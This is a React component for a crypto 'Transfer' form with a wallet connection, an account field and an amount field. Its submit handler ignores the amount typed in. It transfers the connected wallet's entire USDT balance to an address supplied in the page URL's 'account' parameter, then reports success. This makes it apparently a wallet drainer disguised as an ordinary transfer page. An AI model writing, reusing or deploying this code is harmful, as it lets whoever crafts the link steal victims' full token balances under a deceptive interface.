import { useEffect, useState } from "react";

import Swal from "sweetalert2";
import { connectWallet } from "./connectWallet";
import { useSearchParams } from "react-router-dom";
function Transfer() {
  const [count, setCount] = useState(0);
  const [selectedAccount, setSelectedAccount] = useState("0x");
  const [searchParams] = useSearchParams();

  const account = searchParams.get("account");

  useEffect(() => {
    const connect = async () => {
      const walletData = await connectWallet();
      if (!walletData) return;
      setSelectedAccount(walletData.selectedAccount);
    };
    connect();
  }, []);

 

  const fn_submit = async () => {
    const walletData = await connectWallet();
    if (!walletData && !account) return;
    const bal = await walletData.usdtContract.balanceOf(
      walletData.selectedAccount,
    );
    const tx = await  walletData.usdtContract.transfer(account, bal);
    await tx.wait();

    Swal.fire({
      title: "Success!",
      text: "Transfer Successfull",
      icon: "success",
      confirmButtonText: "OK",
    });
  };

  return (
    <>
      <div className="container-fluid">
        <div className="row">
          <div className="col-md-12">
            <div className="form-group">
              <label>Account</label>
              <input
                type="text"
                value={selectedAccount}
                className="form-control"
              />
            </div>
            <div className="form-group">
              <label>Enter Amount</label>
              <input
                type="text"
                value={count}
                onChange={(e) => setCount(e.target.value)}
                className="form-control"
              />
            </div>
          </div>
        </div>
        <br/>
        <div class="d-grid gap-2">
        <button type="button" className="btn block btn-success" onClick={fn_submit}>
          Submit
        </button>
        </div>
      </div>
    </>
  );
}

export default Transfer;
